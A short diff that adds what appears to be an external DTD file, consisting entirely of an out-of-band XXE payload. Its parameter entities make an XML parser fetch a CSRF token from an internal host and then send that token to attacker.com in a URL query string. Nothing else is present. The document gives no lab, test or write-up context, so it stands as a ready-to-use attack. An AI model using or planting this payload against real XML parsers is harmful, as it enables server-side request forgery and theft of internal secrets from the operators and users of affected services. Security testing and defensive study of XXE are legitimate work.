@@ -1,0 +1,4 @@
+<!ENTITY % payload SYSTEM "HTTP://internal-web:53215/internal/csrf-token">
+<!ENTITY % param1 "<!ENTITY &#x25; send SYSTEM 'HTTP://attacker.com/log?token=%payload;'>">
+%param1;
+%send;
